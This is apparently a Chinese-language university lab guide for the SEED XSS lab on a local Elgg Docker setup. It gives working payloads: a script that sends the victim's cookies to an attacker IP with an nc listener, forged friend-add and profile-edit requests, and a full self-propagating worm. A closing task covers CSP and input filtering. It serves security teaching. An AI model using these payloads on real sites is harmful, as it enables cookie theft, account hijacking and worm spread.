# 实验步骤

## 0 环境准备

请从SEED网站下载 [Labsetup.zip](https://seedsecuritylabs.org/Labs_20.04/Web/Web_XSS_Elgg/) 或者指导书位置下载[Lab3-XSS-Labsetup.zip](https://gitee.com/hitsz-cslab/net-work-security/tree/master/stupkt) 文件到你的虚拟机，或者QQ群里的实验3压缩文件，解压缩，进入`Labsetup`文件夹，使用`docker-compose.yml`文件来设置实验环境。


**主机名映射**

本次实验用到一个web应用程序，我们使用Docker来设置这个web应用程序。在实验设置中有两个Docker，一个用于托管web应用程序，另一个用于托管web应用程序的数据库。web应用容器的IP地址为10.9.0.5,web应用程序的URL如下

```
http://www.seed-server.com
```

我们需要将主机名映射到 Docker 的 IP地址。请将以下条目添加到`/etc/hosts`文件。您需要使用根权限来更改此文件(使用`sudo`)。

修改文件的命令可以用 vi , 打开文件后可以用i插入语句，修改完成后先按 esc 键，然后 :wq!  表示保存修改退出。  

```
sudo vi /etc/hosts
```

如果文件中包含如下内容，可以不做修改，否则，你需要把以下命令添加到hosts文件中，保存退出

```
10.9.0.5 www.seed-server.com   // 如果打开的文件不是这个web地址，请修改
10.9.0.5 www.example32a.com
10.9.0.5 www.example32b.com
10.9.0.5 www.example32c.com
10.9.0.5 www.example60.com
10.9.0.5 www.example70.com
```

 **创建容器**

 在 /etc/docker/daemon.json 文件中添加 docker 国内镜像源（目的是速度更快），然后使用命令 dcbuild 创建容器

```
{
        "registry-mirrors": [
                "https://hub-mirror.c.163.com",
                "https://mirror.baidubce.com",
                "https://docker.mirrors.sjtug.sjtu.edu.cn"
        ]       
} 
```
创建容器

```
$ dcbuild
```

**启动容器**

容器创建成功后，才能启动容器

```
$ dcup
```

**查看容器信息**

本次实验中用到的两个容器一个是web应用程序，一个是MySQL数据库

```
$ dockps
20c3333a8cd5  elgg-10.9.0.5
4a101760d086  mysql-10.9.0.6
```


## 本次使用通过以下任务完成一系列跨站脚本（XSS）攻击。

## 任务1：发布恶意消息以显示警告窗口

这个任务的目标是在你的Elgg个人资料中嵌入一个JavaScript程序，以便当其他用户查看你的个人资料时，JavaScript程序将被执行并显示一个警告窗口。给出的JavaScript 程序将显示一个警告窗口：

```
<script>警告脚本;</script>  //警告脚本可以是 alert("XSS")
```

如果你将上述JavaScript代码嵌入到你的个人资料中（例如在简短描述字段中  Brief description 字段），那么任何查看你个人资料的用户都将看到这个警告窗口。

需要选择一个用户登录（除admin外）， 选择 Edit Profile 菜单，在 Aboutme 或者 Birefdescription 等信息框中嵌入你的告警字段。

<center><img src="../assets/12.png" width = 600></center>

请将下面警告页面 “XSS” 显示 你的学号+Hacker 字样。并截图贴在报告中。

<center><img src="../assets/9.png" width = 600></center>


##  任务2：发布恶意消息以显示Cookies

这个任务的目标是在你的Elgg个人资料中嵌入一个 JavaScript 程序，以便当其他用户查看你的个人资料时，用户的 Cookies 将在警告窗口中显示。这可以通过在前面的任务中的 JavaScript 程序添加一些额外的代码来完成，可以将下面的代码替换任务1中的简短描述字段中：

```
<script>alert(document.cookie);</script>
```

请将查看到的cookie信息截图贴在报告中。

##  任务3：窃取受害者的Cookies

在前面的任务中，攻击者编写的恶意 JavaScript 代码可以打印出用户的 Cookie ，但只有用户能看到这些 Cookie ，攻击者无法看到。

在这个任务中，攻击者希望 JavaScript 代码能将 Cookie 发送给他/她自己。为了实现这一点，恶意的 JavaScript 代码需要向攻击者发送一个 HTTP 请求，并在请求中附加 Cookie 。我们可以通过让恶意的 JavaScript 插入一个 <img> 标签，并将其 src 属性设置为攻击者的机器来实现这一点。当 JavaScript 插入 img 标签时，浏览器会尝试从 src 字段中的 URL 加载图像；这将导致向攻击者的机器发送一个 HTTP GET 请求。下面给出的 JavaScript 代码将 Cookie 发送到攻击者机器的5555 端口（假如IP地址为10.9.0.1），攻击者的 TCP 服务器在该端口监听。

脚本如下，需要将下面的 10.9.0.1 换成自己虚拟机的 IP 地址，端口你可以选择5555也可以选取其他不常用的端口，但是这里填写的端口必须和监听的端口一致，比如我们实验室的虚拟机 IP 地址可能是 192.168.56.101

```
<script>document.write('<img src=http://10.9.0.1:5555?c=' + escape(document.cookie) + ' >');</script>
```

攻击者常用的一个程序是 netcat（或nc），如果以 “-l” 选项运行，它将成为一个在指定端口上监听连接的 TCP 服务器。这个服务器程序基本上会打印出客户端发送的任何内容，并将服务器用户键入的内容发送给客户端。键入以下命令以在 5555 端口上监听：

```
$ nc -lknv 5555
```

!!! info "提示 :sparkles:"
    -l 选项用于指定nc应该监听传入的连接，而不是启动到远程主机的连接。-nv 选项用于使nc给出更详细的输出。-k 选项意味着当一个连接完成后，继续监听另一个连接。

请将你观察到的信息截图贴到报告中。

## 任务4：成为受害者的朋友

在这一项和下一项任务中，我们将执行类似于 2005 年 Samy 对 MySpace 进行的攻击（即 Samy 蠕虫病毒）。我们将编写一个跨站脚本（XSS）蠕虫病毒，该病毒会将访问 Samy 页面的任何其他用户添加 Samy 为好友。这种蠕虫病毒不会自我传播；在任务6中，我们将使其具有自我传播能力。

在这项任务中，我们需要编写一个恶意的 JavaScript 程序，该程序能够直接从受害者的浏览器中伪造HTTP请求，而无需攻击者的干预。攻击的目的是将Samy添加为受害者的好友。我们已经在 Elgg 服务器上创建了一个名为 Samy 的用户（用户名为 samy ）。

为了给受害者添加好友，我们首先应该了解合法用户在 Elgg 中如何添加好友。更具体地说，我们需要弄清楚当用户添加好友时，会向服务器发送什么信息。Firefox 的HTTP 开发工具可以帮助我们获取这些信息。它可以显示从浏览器发送的任何 HTTP 请求消息的内容。从内容中，我们可以识别请求中的所有参数。下面三幅图显示如何打开这个工具并查看具体消息的参数。

<center><img src="../assets/5.png" width = 600></center>

<center><img src="../assets/7.png" width = 600></center>

<center><img src="../assets/11.png" width = 600></center>


一旦我们了解了添加好友的HTTP请求是什么样的，我们就可以编写一个 JavaScript 程序来发送相同的 HTTP 请求。我们提供了一个框架 JavaScript 代码，以帮助完成任务。

下面 firend = 56 这个 id 的值要根据实际用户的 id 替换，可以参上图中的具体信息，里面有 id 的值。

```
<script type="text/javascript">
window.onload = function () {
    var Ajax = null;
    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;

  	var sendurl = "http://www.seed-server.com/action/friends/add?friend=56" + ts + token; 
	Ajax = new XMLHttpRequest();
	Ajax.open("GET", sendurl, true);
	Ajax.setRequestHeader("Host", "www.seed-server.com");
	Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
	Ajax.send();
}
</script>
```

上述代码应放置在 Samy 个人资料页面的 “About me” 字段中。此字段提供两种编辑模式：编辑器模式（默认）和文本模式。编辑器模式会在输入到字段中的文本中添加额外的 HTML 代码，而文本模式则不会。由于我们不想在攻击代码中添加任何额外的代码，因此在输入上述JavaScript代码之前，应启用文本模式。这可以通过点击“About me”文本字段右上角的 “HTML editor” 编程 “Visual editor”来完成。

请将samy作为攻击者，至少成为其他两个用户的朋友，并将你观察的结果截图贴到报告中。

## 任务5：修改受害者的个人资料

本任务的目标是在受害者访问 Samy 的页面时修改其个人资料。具体来说，就是要修改受害者的“About me”字段。我们将编写一个跨站脚本（XSS）蠕虫病毒来完成此任务。这种蠕虫病毒不会自我传播；在任务6中，我们将使其具有自我传播能力。

与之前的任务类似，我们需要编写一个恶意的 JavaScript 程序，该程序能够直接从受害者的浏览器中伪造 HTTP 请求，而无需攻击者的干预。为了修改个人资料，我们首先应该了解合法用户在 Elgg 中如何编辑或修改其个人资料。更具体地说，我们需要弄清楚如何构建 HTTP POST 请求来修改用户的个人资料。我们将使用 Firefox 的HTTP 开发者工具查看一条修改个人信息的请求信息。一旦我们了解了修改个人资料的 HTTP POST 请求是什么样的，我们就可以编写一个 JavaScript 程序来发送相同的 HTTP 请求。我们已经提供完整的代码，以帮助完成任务，但是你需要找到对应的 id 和将你的学号替换到其中，并仔细阅读代码，思考下 ts 和 token这两个字段的功能。

```
<script type="text/javascript">
    window.onload = function(){
        var userName=elgg.session.user.name;
        var guid="&guid="+elgg.session.user.guid;
        var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
        var token="&__elgg_token="+elgg.security.token.__elgg_token;
        var content= token + ts + "name=" + userName + "&description=<p>This had been changed by 你的学号 XSS attack.</p> &accesslevel[description]=2" + guid;
        var sendurl = "http://www.seed-server.com/action/profile/edit"
        var samyGuid=56;
        if(elgg.session.user.guid!=samyGuid)
        {
            var Ajax=null;
            Ajax=new XMLHttpRequest();
            Ajax.open("POST",sendurl,true);
            Ajax.setRequestHeader("Host","www.seed-server.com");
            Ajax.setRequestHeader("Content-Type",
            "application/x-www-form-urlencoded");
            Ajax.send(content);
        }
	}
</script>
```

与任务4类似，上述代码应放置在 Samy 个人资料页面的“About me”字段中，并且在输入上述 JavaScript 代码之前，应启用文本模式。

请将samy作为攻击者，至少修改其他一个用户的信息，并将你观察的结果截图贴到报告中，在报告中你还需要描述这两个任务中用到的 ts 和 token 这两个字段的功能。


## 任务6：编写自我传播的跨站脚本蠕虫病毒（XSS Worm）

为了成为一个真正的蠕虫病毒，恶意的JavaScript程序应该能够自我传播。也就是说，每当有人查看被感染的个人资料时，不仅他们的个人资料会被修改，蠕虫病毒也会传播到他们的个人资料中，进一步影响查看这些新感染的个人资料的其他人。通过这种方式，查看被感染个人资料的人越多，蠕虫病毒传播的速度就越快。这正是Samy蠕虫病毒所使用的机制：在2005年10月4日发布后的仅仅20小时内，就有超过100万用户受到影响，使Samy成为有史以来传播速度最快的病毒之一。能够实现这一点的JavaScript代码被称为自传播的跨站脚本蠕虫病毒。在这个任务中，你需要实现这样一个蠕虫病毒，它不仅修改受害者的个人资料并添加用户“Samy”为好友，而且将蠕虫病毒本身的副本添加到受害者的个人资料中，这样受害者就变成了攻击者。

为了实现自我传播，当恶意的JavaScript修改受害者的个人资料时，它应该将自己复制到受害者的个人资料中。有几种方法可以实现这一点，我们将讨论两种常见的方法。

本次实验我们用 DOM 的方法实现攻击，如果整个JavaScript程序（即蠕虫病毒）嵌入在被感染的个人资料中，为了将蠕虫病毒传播到另一个个人资料，蠕虫病毒代码可以使用DOM API从网页中检索其自身的副本。下面给出了使用DOM API的示例。此代码获取其自身的副本，并在警告窗口中显示它：

```
<script id="worm" type="text/javascript">
    window.onload = function(){
        var headerTag = "<script id=\'worm\' type=\'text/javascript\'>";
        var jsCode = document.getElementById("worm").innerHTML;
        var tailTag = "</" + "script>"; 
        var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
        var userName=elgg.session.user.name;
        var guid="&guid="+elgg.session.user.guid;
        var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
        var token="&__elgg_token="+elgg.security.token.__elgg_token;
        var content= token + ts + "&name=" + userName + "&description=<p>Hacked by 你的学号 XSS WORM !!!"+ wormCode + "</p> &accesslevel[description]=2" + guid;
        var sendurl = "http://www.seed-server.com/action/profile/edit"
        var samyGuid=56;
        if(elgg.session.user.guid!=samyGuid){
            var Ajax=null;
            Ajax=new XMLHttpRequest();
            Ajax.open("POST",sendurl,true);
            Ajax.setRequestHeader("Host","www.seed-server.com");
            Ajax.setRequestHeader("Content-Type",
            "application/x-www-form-urlencoded");
            Ajax.send(content);
        }
    }
</script>
```

需要注意的是，innerHTML（第2行）只提供代码的内部部分，不包括周围的<script>标签。我们只需添加起始标签<script id="worm">（第1行）和结束标签</script>（第4行），即可形成恶意代码的相同副本。

!!! info "提示 :sparkles:"
    当通过HTTP POST请求发送数据，且Content-Type设置为application/x-www-form-urlencoded时（这是我们的代码中所使用的类型），数据也应该进行编码。这种编码方案称为URL编码，它将数据中的非字母数字字符替换为%HH，即一个百分号和两个表示字符ASCII码的十六进制数字。第行中的encodeURIComponent()函数用于对字符串进行URL编码。


请将samy作为攻击者，先感染alice再感染boby，观察结果并截图贴到报告中，并思考上述代码的内容为什么能够觉有自我传播功能。

## 任务7：使用CSP（内容安全策略）抵御XSS攻击

跨站脚本攻击（XSS）漏洞的根本问题是HTML允许JavaScript代码与数据混合。因此，为了解决这个根本问题，我们需要将代码与数据分离。在HTML页面中包含JavaScript代码有两种方式，一种是内联方式，另一种是链接方式。

内联方式直接将代码嵌入页面内，而链接方式则将代码放在外部文件中，然后从页面内部链接到它。

内联方式是导致跨站脚本攻击（XSS）漏洞的罪魁祸首，因为浏览器不知道代码最初来自哪里：是来自可信任的Web服务器还是来自不可信任的用户？没有这些知识，浏览器就不知道哪些代码是安全的，哪些是危险的。链接方式为浏览器提供了一个非常重要的信息，即代码的来源。然后，网站可以告诉浏览器哪些来源是可信的，这样浏览器就知道哪段代码是安全的。尽管攻击者也可以使用链接方式在输入中包含代码，但他们无法将其代码放置在那些可信任的位置。

网站如何告诉浏览器哪个代码源是可信的，这是通过使用一种称为内容安全策略（CSP）的安全机制来实现的。这种机制是专门为击败跨站脚本攻击（XSS）和点击劫持攻击而设计的。它已成为一种标准，现在大多数浏览器都支持它。CSP不仅限制JavaScript代码，还限制其他页面内容，例如限制图片、音频和视频的来源，以及限制页面是否可以放在iframe中（用于击败点击劫持攻击）。在这里，我们将只关注如何使用CSP来击败跨站脚本攻击（XSS）。


Elgg确实有内置的对抗措施来防御XSS攻击。我们已经停用并注释掉了这些对抗措施，以便攻击能够起作用。Elgg网络应用程序上有一个自定义的安全插件HTMLawed，激活后，它会验证用户输入并移除输入中的标签。这个特定的插件在elgg/engine/lib/input.php文件的function filter tags中注册。

要启用对抗措施，请以管理员身份登录应用程序，转到“帐户”->“管理”（屏幕右上角）->“插件”（右侧面板），然后在页面顶部的过滤器选项中点击“安全和垃圾邮件”。您应该会在下面找到HTMLawed插件。点击“激活”以启用对抗措施。

除了Elgg中的HTMLawed 1.9安全插件外，还有另一种内置的PHP方法称为htmlspecialchars()，该方法用于对用户输入中的特殊字符进行编码，例如将“<”编码为&lt，“>”编码为&gt等。请转到/var/www/XSS/Elgg/vendor/elgg/elgg/views/default/output/，并在text.php、url.php、dropdown.php和email.php文件中找到函数调用htmlspecialchars。在每个文件中取消注释相应的“htmlspecialchars”函数调用。

一旦您知道如何启用这些对抗措施，请执行以下操作（请不要更改任何其他代码，并确保没有语法错误）：

激活HTMLawed对抗措施或者激活htmlspecialchars，任选一种对抗措施；访问任意一个受害者的个人资料，并在报告中描述你的观察结果。